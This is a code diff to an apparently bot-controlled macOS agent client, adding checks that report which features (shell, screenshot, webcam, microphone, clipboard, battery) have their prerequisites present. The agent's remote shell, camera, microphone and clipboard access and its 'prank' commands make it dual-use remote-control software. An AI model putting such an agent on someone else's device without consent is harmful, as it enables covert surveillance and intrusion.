@@ -5,6 +5,7 @@
 """
 import base64
 import io
+import importlib.util
 import json
 import logging
 import os
@@ -110,6 +111,48 @@ SUPPORTED_COMMANDS = (
     "prank_stop_all",
     "agent_update", "uninstall_agent",
 )
+
+
+def _module_available(name: str) -> bool:
+    try:
+        return importlib.util.find_spec(name) is not None
+    except (ImportError, ValueError):
+        return False
+
+
+def _command_available(name: str, fallback_paths: tuple[str, ...]) -> bool:
+    return bool(shutil.which(name) or any(Path(path).is_file() for path in fallback_paths))
+
+
+def _detect_feature_status() -> dict[str, str]:
+    """Report prerequisites only; never claim a live hardware/permission test."""
+    statuses = {
+        "shell": "supported",
+        "open_app": "supported",
+        "geolocation": "approximate",
+        "screenshot": (
+            "permission_unverified"
+            if _command_available("screencapture", ("/usr/sbin/screencapture",))
+            else "unavailable"
+        ),
+        "webcam": "permission_unverified" if _module_available("cv2") else "dependency_missing",
+        "microphone": (
+            "permission_unverified"
+            if _module_available("sounddevice") and _module_available("soundfile")
+            else "dependency_missing"
+        ),
+        "clipboard": (
+            "device_unverified"
+            if _command_available("pbpaste", ("/usr/bin/pbpaste",))
+            and _command_available("pbcopy", ("/usr/bin/pbcopy",))
+            else "unavailable"
+        ),
+    }
+    try:
+        statuses["battery"] = "supported" if psutil.sensors_battery() is not None else "unavailable"
+    except Exception:
+        statuses["battery"] = "unknown"
+    return statuses
 
 
 def _humanize_seconds(secs):
@@ -762,11 +805,21 @@ class XgentClient:
         if app: subprocess.run(["open", app], check=False)
 
     def _do_capabilities(self, payload: dict) -> None:
+        feature_status = _detect_feature_status()
         self._publish_response("capabilities", {
             "type": "capabilities", "device_id": DEVICE_ID, "platform": PLATFORM,
             "version": VERSION, "hostname": socket.gethostname(),
             "commands": sorted(SUPPORTED_COMMANDS),
-            "features": {"battery": True, "shell": True, "open_app": True, "mic": True, "clipboard": True}
+            # `features` stays for older bot builds. It means prerequisites
+            # were detected, not that hardware/TCC permissions were exercised.
+            "features": {
+                "battery": feature_status["battery"] == "supported",
+                "shell": feature_status["shell"] == "supported",
+                "open_app": feature_status["open_app"] == "supported",
+                "mic": feature_status["microphone"] == "permission_unverified",
+                "clipboard": feature_status["clipboard"] == "device_unverified",
+            },
+            "feature_status": feature_status,
         })
 
     def _do_lock_screen(self, payload: dict) -> None:
